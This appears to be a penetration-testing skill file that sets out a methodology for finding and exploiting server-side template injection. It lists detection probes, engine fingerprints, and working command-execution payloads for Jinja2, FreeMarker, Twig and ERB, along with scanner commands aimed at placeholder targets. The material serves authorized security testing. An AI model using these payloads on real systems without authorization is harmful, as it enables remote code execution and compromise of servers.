---
name: attack-ssti
description: "Server-Side Template Injection — detection, engine fingerprinting, and exploitation across 7 template engines"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - ssti
  - rce
  - injection
  - web
  - attack
tech_stack:
  - web
  - python
  - java
  - ruby
  - php
cwe_ids:
  - CWE-94
  - CWE-1336
chains_with:
  - attack-ssrf
prerequisites: []
severity_boost:
  attack-ssrf: "SSTI → SSRF → internal service access = RCE chain"
---

# Server-Side Template Injection (SSTI)

## Objective

Detect and exploit server-side template injection to achieve code execution on the server.

## Testing Methodology

### Phase 1: Detection

```bash
# Automated SSTI detection across 7 engines
attack_script ssti_tester "https://TARGET/search?q=FUZZ" --param q --json-output

# Quick mode (math payloads only)
attack_script ssti_tester "https://TARGET/render" --param template --quick
```

### Phase 2: Generic Detection Payloads

Inject into every user-controlled parameter:

```
{{7*7}}           → 49 (Jinja2, Twig)
${7*7}            → 49 (FreeMarker, Velocity, EL)
<%= 7*7 %>        → 49 (ERB, JSP)
#{7*7}            → 49 (Thymeleaf)
{{7*'7'}}         → 7777777 (Jinja2 string multiplication)
```

### Phase 3: Engine Fingerprinting

```
{{config.items()}}                    → Jinja2 (Flask/Python)
{{request.application.__globals__}}   → Jinja2
${T(java.lang.Runtime)}               → Spring EL
<#assign x=1>${x}                     → FreeMarker
{{_self.env.getFilter('id')}}         → Twig (PHP)
<%= system('id') %>                   → ERB (Ruby)
```

### Phase 4: Exploitation

**Jinja2 (Python/Flask):**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
```

**FreeMarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
```

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

**ERB (Ruby):**
```
<%= `id` %>
<%= system('id') %>
```

### Phase 5: POST-based Injection

```bash
# Test POST parameters
attack_script ssti_tester "https://TARGET/api/render" --param content --method POST --data '{"content":"FUZZ"}'
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Math expression evaluated (7*7=49) | High (P2) |
| Config/env data leaked | High (P2) |
| Command execution achieved | Critical (P1) |
| File read via template | Critical (P1) |

## Evidence Requirements

- Injection point (parameter, endpoint)
- Payload sent
- Server response showing template evaluation
- Template engine identified
- For RCE: command output in response

## Tools

- `attack_script ssti_tester` — automated multi-engine detection
- `tplmap` (external) — SSTI exploitation framework

## References

- [PortSwigger: SSTI](https://portswigger.net/research/server-side-template-injection)
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
